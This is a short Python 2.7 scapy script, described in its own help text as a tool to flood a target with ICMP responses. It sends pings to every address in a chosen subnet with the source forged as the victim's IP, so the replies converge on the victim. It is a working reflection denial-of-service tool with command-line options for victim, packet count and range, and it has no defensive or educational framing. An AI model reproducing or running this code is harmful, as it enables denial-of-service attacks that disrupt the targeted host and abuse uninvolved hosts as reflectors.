#!/usr/bin/env python2.7
import argparse
from scapy.all import *
import re
import ipaddress
import socket

# the 'victim' is the IP address to spoof - so that packets appear to come FROM them
def attack(victim, numPings, mask):
    try:
        # create an ipv4 network that matches the CIDR mask given
        # this gives us a list of addresses to iterate over and send ICMP packets to
        net = ipaddress.IPv4Network(unicode(mask, "utf-8"))
        print("beginning attack...")
    except:
        print("Probably poorly formatted subnet mask")
        quit()

    x = 0
    for ip in net:
        x = x + 1
        print("pinging from... " + str(ip))
        evilPing = IP(src=victim, dst=str(ip))/ICMP()
        send(evilPing, verbose=0)
        # sendBytes(evilPing, victim)
        if x == numPings:
            print("All packets sent!")
            quit()

    print("attack complete!")


# try sending via python socket instead of with scapy
def sendBytes(packet, target):
    try:
        b = bytes(packet)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,31337))
        s.send(b)
        print("sent packet via raw socket...")
    except Exception, e:
        raise e
    


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Begin pinging random IP addresses, spoofing the source address to flood a target with ICMP responses')
    parser.add_argument('-t', metavar='victim', help='the target IPv4 address')
    parser.add_argument('-n', metavar='numPings', help='the number of random addresses to send the spoofed pings to', nargs='?', default=1)
    parser.add_argument('-m', metavar='mask', help='subnet mask for addresses to ping', nargs='?', default='192.168.0.0/1')

    args = parser.parse_args()
    victim = args.t
    try:
        numPings = int(args.n)
    except:
        print("enter a number for -n flag")
        quit()

    mask = args.m

    if re.search("^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", victim) is None or victim == "":
        print("Incorrect victim address format")
        quit()

    if re.search("^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/[0-9]{1,2}$", mask) is None:
        print("Incorrect mask format")
        quit()

    attack(victim, numPings, mask)
